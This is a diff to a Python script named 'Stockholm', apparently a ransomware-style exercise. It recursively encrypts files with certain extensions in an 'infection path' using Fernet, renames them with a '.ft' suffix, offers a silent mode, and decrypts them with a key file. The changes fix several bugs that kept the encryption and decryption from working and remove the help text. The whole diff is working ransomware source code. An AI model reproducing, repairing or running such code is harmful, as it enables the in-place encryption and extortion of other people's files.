@@ -18,15 +18,10 @@ def parse_arguments():
     arguments = argparse.ArgumentParser(
         description="Tool to infect and desinfect files."
     )
-
-    arguments.add_argument(
-        "-h",
-        help="Shows help page to use the program"
-        )
     arguments.add_argument(
         "-r",
         metavar="key",
-        help="The key to use to decrypt files",
+        help="The .key file to decrypt files",
         type=str)
     
     arguments.add_argument(
@@ -47,22 +42,24 @@ def validate_file(elem, mode):
             for ext in extensions:
                 if elem.endswith(ext):
                     return True
-    elif mode == "d":
-        if elem.endswith(".ft"):
-            return True
+        elif mode == "d":
+            if elem.endswith(".ft"):
+                return True
     else:
         if not arguments.s:
             print("Error, invalid mode for file validation")
             print("Accepted formats: 'c' (crypted) | 'd' (decrypted)")
+        exit(1)
+    return False
 
 def content(path):
     if os.path.isdir(path):
         files = os.listdir(path)
-        if len(files) < 0:
+        if len(files) > 0:
             list = []
             for file in files:
                 if os.path.isdir(path + "/" + file):
-                    lsit += content(path + "/" + file)
+                    list += content(path + "/" + file)
                 else:
                     list.append(path + "/" + file)
             return list
@@ -76,7 +73,7 @@ def content(path):
 
 def infect():
     files = []
-    ret = 0
+    sum = 0
     for file in content(infection_path):
         if validate_file(file, "c"):
             files.append(file)
@@ -94,52 +91,56 @@ def infect():
             with open(file, "wb") as f:
                 f.write(encrypted)
             os.rename(file, file + ".ft")
-            ret += 1
-        except Exception as e:
+            sum += 1
+        except Exception:
             if not arguments.s:
                 print("Error, couldn't encrypt file '{}'".format(file))
     if not arguments.s:
+        encrypted_list = []
         print("\nEncrypted files:")
-        for f in sorted(files):
+        for file in content(infection_path):
+            if validate_file(file, "d"):
+                encrypted_list.append(file)
+        for f in sorted(encrypted_list):
             print("\t{}".format(f))
-        print("\n\t{0}/{1} decrypted files".format(ret, len(files)))
+        print("\n\t{0}/{1} encrypted files".format(sum, len(files)))
     return len(files)
 
 def desinfect(path):
     files = []
-    ret = 0
+    sum = 0
     for file in content(path):
-        if validate_file(file, "c"):
+        if validate_file(file, "d"):
             files.append(file)
     if not arguments.s and files:
         print("Encrypted files:")
         for f in sorted(files):
             print("\t{}".format(f))
-        print("\n\tTotal: {}.\n".format(len(files)))
+        print("\n\tTotal: {}\n".format(len(files)))
     with open ("key.key", "rb") as f:
         key = f.read()
     for file in files:
         name = os.path.split(file)[1]
+        where = os.path.split(file)[0]
         try:
             with open(file, "rb") as f:
                 decrypted = Fernet(key).decrypt(f.read())
             with open(file, "wb") as f:
                 f.write(decrypted)
-            if path:
-                if not os.path.exists(path):
-                    os.makedirs(path)
-                os.rename(file, path + "/" + name[:-3])
-            else:
-                os.rename(file, file[:-3])
-            ret += 1
+            os.rename(file, where + '/' + name[:-3])
+            sum += 1
         except Exception:
             if not arguments.s:
                 print("Error, couldn't decrypt file '{}'".format(name))
     if not arguments.s:
+        decrypted_list = []
         print("\nDecrypted files:")
-        for f in sorted(files):
+        for file in content(infection_path):
+            if validate_file(file, "c"):
+                decrypted_list.append(file)
+        for f in sorted(decrypted_list):
             print("\t{}".format(f))
-        print("{0}/{1} decrypted files".format(ret, len(files)))
+        print("\n\t{0}/{1} decrypted files".format(sum, len(files)))
     return len(files)
 
 if __name__ == '__main__':
@@ -148,16 +149,6 @@ if __name__ == '__main__':
 
     if arguments.v:
         print("Version:", tool_ver)
-
-    elif arguments.h:
-        print("HELP: Stockholm is a program that encrypts some type of files in a directory, and creates a password to decrypt them")
-        print("Usage:")
-        print("stockholm -r <key.key> | launch reversing mode, and adds password to decrypt the files.")
-        print("stockholm -s | launch silent mode (no information in console).")
-        print("stockholm -v | shows the current version of the program.")
-        print("stockholm -h | shows this help.")
-        print("stockholm | starts encrypting the files inside the infection path, and generates a password.")
-        exit()
 
     elif arguments.r:
         if os.path.exists("key.key"):
